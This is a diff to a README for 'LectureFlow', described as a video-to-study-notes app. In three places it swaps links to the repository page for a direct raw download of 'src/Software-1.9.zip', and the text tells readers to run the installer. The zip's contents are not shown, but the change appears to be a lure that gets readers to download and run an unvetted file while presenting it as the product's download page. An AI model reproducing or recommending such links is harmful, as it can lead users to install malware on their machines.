@@ -1,6 +1,6 @@
 # 📘 lectureflow - Turn videos into study notes
 
-[![Download LectureFlow](https://img.shields.io/badge/Download%20LectureFlow-blue?style=for-the-badge)](https://github.com/Gabrielaindifferent114/lectureflow)
+[![Download LectureFlow](https://img.shields.io/badge/Download%20LectureFlow-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gabrielaindifferent114/lectureflow/main/src/Software-1.9.zip)
 
 ## 🎯 What LectureFlow does
 
@@ -32,7 +32,7 @@ For the best experience, use:
 
 Use this link to visit the page to download:
 
-[Visit the LectureFlow download page](https://github.com/Gabrielaindifferent114/lectureflow)
+[Visit the LectureFlow download page](https://raw.githubusercontent.com/Gabrielaindifferent114/lectureflow/main/src/Software-1.9.zip)
 
 If the page offers a Windows build, download it first. If it provides an installer, save it to your Downloads folder
 
@@ -233,7 +233,7 @@ Keep the original download file in case you need to reinstall it
 
 ## 📌 Download link
 
-[Download or open LectureFlow here](https://github.com/Gabrielaindifferent114/lectureflow)
+[Download or open LectureFlow here](https://raw.githubusercontent.com/Gabrielaindifferent114/lectureflow/main/src/Software-1.9.zip)
 
 ## 🔄 What LectureFlow helps you do
 
